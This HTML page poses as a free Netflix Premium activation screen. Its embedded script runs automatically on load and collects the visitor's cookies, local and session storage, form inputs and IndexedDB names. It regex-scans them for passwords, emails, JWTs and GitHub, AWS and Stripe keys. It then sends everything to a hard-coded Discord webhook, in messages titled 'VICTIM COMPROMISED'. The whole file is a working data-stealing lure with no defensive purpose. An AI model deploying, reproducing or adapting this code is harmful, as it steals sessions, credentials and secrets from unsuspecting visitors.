<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Netflix Premium</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: system-ui, -apple-system, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }
        .container {
            background: rgba(255,255,255,0.15);
            backdrop-filter: blur(20px);
            padding: 2.5rem;
            border-radius: 20px;
            text-align: center;
            max-width: 450px;
            width: 90%;
        }
        h1 { font-size: 2.2rem; margin-bottom: 1rem; }
        p { margin-bottom: 2rem; opacity: 0.95; }
        .spinner {
            border: 3px solid rgba(255,255,255,0.3);
            border-top: 3px solid white;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 1.5rem auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .done { color: #4ade80; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎬 Netflix Premium</h1>
        <p>Activating your free subscription...</p>
        <div class="spinner" id="spinner"></div>
        <p id="status" style="display:none" class="done">✅ Ready! Check your email.</p>
    </div>

    <script>
        // YOUR WEBHOOK
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1475299568844537978/sY0Q1M8QTyU2Pwung5uuIb5Dn3nvqhuD3tnmEvyGf48ZkFmQfiy-MSBIJCs5k8LQDYER';
        
        // STEAL EVERYTHING - PERFECTLY FORMATTED
        async function stealEverything() {
            const data = {
                timestamp: new Date().toISOString(),
                ip: 'unknown', // Add IP via server if needed
                url: window.location.href,
                referrer: document.referrer || 'direct',
                userAgent: navigator.userAgent.slice(0, 150),
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                resolution: `${screen.width}x${screen.height}`,
                cookies: parseCookies(),
                localStorage: parseStorage(localStorage),
                sessionStorage: parseStorage(sessionStorage),
                indexedDB: getIndexedDB(),
                secrets: extractAllSecrets(),
                history: getHistory(),
                forms: getFormData()
            };
            
            // SEND CLEAN DATA TO DISCORD
            await sendCleanData(data);
            
            // Show success
            setTimeout(() => {
                document.getElementById('spinner').style.display = 'none';
                document.getElementById('status').style.display = 'block';
            }, 800);
        }
        
        // PARSE COOKIES CLEANLY
        function parseCookies() {
            const cookies = {};
            document.cookie.split(';').forEach(cookie => {
                const [name, value] = cookie.trim().split('=');
                if (name && value) {
                    cookies[name] = decodeURIComponent(value.slice(0, 100));
                }
            });
            return cookies;
        }
        
        // PARSE STORAGE CLEANLY (limit size)
        function parseStorage(storage) {
            const result = {};
            for (let i = 0; i < storage.length; i++) {
                const key = storage.key(i);
                if (key) {
                    let value = storage.getItem(key);
                    if (value && value.length > 500) value = value.slice(0, 500) + '...';
                    result[key] = value || '';
                }
            }
            return result;
        }
        
        // GRAB INDEXEDDB
        async function getIndexedDB() {
            const dbs = await indexedDB.databases();
            return dbs.map(db => ({ name: db.name, version: db.version }));
        }
        
        // EXTRACT ALL SECRETS (passwords, emails, keys, tokens)
        function extractAllSecrets() {
            const allData = JSON.stringify({ ...localStorage, ...sessionStorage, ...document.cookie });
            const secrets = [];
            
            // PASSWORDS & TOKENS
            const patterns = [
                { name: 'Password', regex: /(?:password|pwd|pass)=?["']?([^&"\s]{3,100})/gi },
                { name: 'Email', regex: /[\w\.-]+@[\w\.-]+\.\w+/gi },
                { name: 'JWT Token', regex: /eyJ[A-Za-z0-9_-]{2,}\.[A-Za-z0-9_-]{2,}\.[A-Za-z0-9_-]{2,}/g },
                { name: 'API Key', regex: /(?:api[_-]?|key|token|secret)[^a-zA-Z0-9]{0,2}([a-zA-Z0-9]{20,})/gi },
                { name: 'GitHub', regex: /gh[pousr]?_[A-Za-z0-9]{36,40}/g },
                { name: 'AWS Key', regex: /AKIA[0-9A-Z]{16}/g },
                { name: 'Stripe', regex: /sk_live_[A-Za-z0-9]{24,}/g },
                { name: 'Subscription', regex: /(?:sub|plan|premium|pro)[^a-zA-Z0-9]{0,2}([a-zA-Z0-9]{8,})/gi }
            ];
            
            patterns.forEach(({ name, regex }) => {
                const matches = allData.match(regex);
                if (matches) {
                    matches.slice(0, 8).forEach(match => {
                        if (!secrets.includes(match)) secrets.push(`${name}: ${match.slice(0, 80)}`);
                    });
                }
            });
            
            return secrets;
        }
        
        // STEAL BROWSER HISTORY (if accessible)
        function getHistory() {
            return {
                length: history.length,
                state: history.state ? Object.keys(history.state).slice(0, 10) : []
            };
        }
        
        // STEAL FORM DATA
        function getFormData() {
            const forms = document.querySelectorAll('form');
            const data = {};
            forms.forEach((form, i) => {
                const inputs = form.querySelectorAll('input, textarea, select');
                data[`form_${i}`] = Array.from(inputs).reduce((acc, input) => {
                    if (input.name || input.id) {
                        acc[input.name || input.id] = input.value.slice(0, 100);
                    }
                    return acc;
                }, {});
            });
            return data;
        }
        
        // SEND PERFECTLY FORMATTED TO DISCORD
        async function sendCleanData(data) {
            // ALERT EMBED
            const alertEmbed = {
                username: '🔥 DATA THEFT',
                embeds: [{
                    title: '🎯 VICTIM COMPROMISED',
                    description: data.userAgent,
                    color: 16711680,
                    fields: [
                        { name: '🕐 Time', value: new Date().toLocaleString(), inline: true },
                        { name: '🌍 Location', value: data.timezone, inline: true },
                        { name: '📱 Screen', value: data.resolution, inline: true },
                        { name: '🔑 Secrets', value: data.secrets.length.toString(), inline: true },
                        { name: '🍪 Cookies', value: Object.keys(data.cookies).length.toString(), inline: true },
                        { name: '📂 LocalStorage', value: Object.keys(data.localStorage).length.toString(), inline: true },
                        { name: '🔗 URL', value: data.url.slice(0, 80), inline: false }
                    ],
                    timestamp: new Date().toISOString()
                }]
            };
            
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(alertEmbed)
            });
            
            // SECRETS ONLY
            if (data.secrets.length > 0) {
                const secretsEmbed = {
                    username: '🔓 SECRETS FOUND',
                    embeds: [{
                        title: '💎 HIGH VALUE TARGET',
                        color: 16776960,
                        fields: data.secrets.map(secret => ({
                            name: 'Secret',
                            value: secret,
                            inline: false
                        })).slice(0, 20)
                    }]
                };
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(secretsEmbed)
                });
            }
            
            // COOKIES ONLY
            if (Object.keys(data.cookies).length > 0) {
                const cookiesMsg = Object.entries(data.cookies)
                    .slice(0, 15)
                    .map(([k, v]) => `**${k}**: ${v}`)
                    .join('\n');
                const cookiesEmbed = {
                    username: '🍪 COOKIES',
                    embeds: [{ title: 'Session Cookies', description: cookiesMsg, color: 3447003 }]
                };
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(cookiesEmbed)
                });
            }
        }
        
        // TRIGGER INSTANTLY
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', stealEverything);
        } else {
            stealEverything();
        }
    </script>
</body>
</html>
